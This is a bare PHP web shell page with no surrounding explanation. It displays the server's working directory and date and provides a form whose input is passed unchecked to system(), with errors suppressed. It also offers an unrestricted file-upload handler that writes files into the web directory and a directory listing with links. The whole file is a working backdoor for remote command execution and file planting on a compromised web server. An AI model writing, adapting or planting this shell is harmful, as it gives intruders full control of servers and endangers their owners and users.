
-------------------------------------------------------------------------------------------------------------<br>



<!--Display the path-->
Current path is: <?php
echo getcwd()
?><br>
-------------------------------------------------------------------------------------------------------------<br>
<!--Display the Date-->
<?php


// Return date/time info of a timestamp; then format the output
$mydate=getdate(date("U"));
echo "$mydate[weekday], $mydate[month] $mydate[mday], $mydate[year]";
?><br>




--------------------------------------------------------------------------------------------------------------<br>
Command execution
<p align="center"><form method="post">
<textarea size="70" name="command" rows="2" cols="40" ></textarea> <br>
<br><input type="submit" value="Execute!"><br>
&nbsp;<br></p>
      </form>
      <p align="center">
        <textarea readonly size="1" rows="7" cols="53"><?php @$output = system($_POST['command']); ?></textarea><br>
        <br>

--------------------------------------------------------------------------------------------------------------<br>
		

<!--Display directory listing -->
<?php
if (!empty($_FILES["file"]))
{
if ($_FILES["file"]["error"] > 0)
{echo "Error: " . $_FILES["file"]["error"] . "<br>";}
else
{echo "Stored file:".$_FILES["file"]["name"]."<br/>Size:".($_FILES["file"]["size"]/1024)." kB<br/>";
move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);
}
}
// open this directory 
$myDirectory = opendir(".");
// get each entry
while($entryName = readdir($myDirectory)) {$dirArray[] = $entryName;} closedir($myDirectory);
$indexCount = count($dirArray);
echo "$indexCount files<br/>";
sort($dirArray);
echo "<TABLE border=1 cellpadding=5 cellspacing=0 class=whitelinks><TR><TH>Filename</TH><th>Filetype</th><th>Filesize</th></TR>\n";
for($index=0; $index < $indexCount; $index++) 
{
if (substr("$dirArray[$index]", 0, 1) != ".")
{
echo "<TR>
<td><a href=\"$dirArray[$index]\">$dirArray[$index]</a></td>
<td>".filetype($dirArray[$index])."</td>
<td>".filesize($dirArray[$index])."</td>
</TR>";
}
}
echo "</TABLE>";
?>


</body>
</html>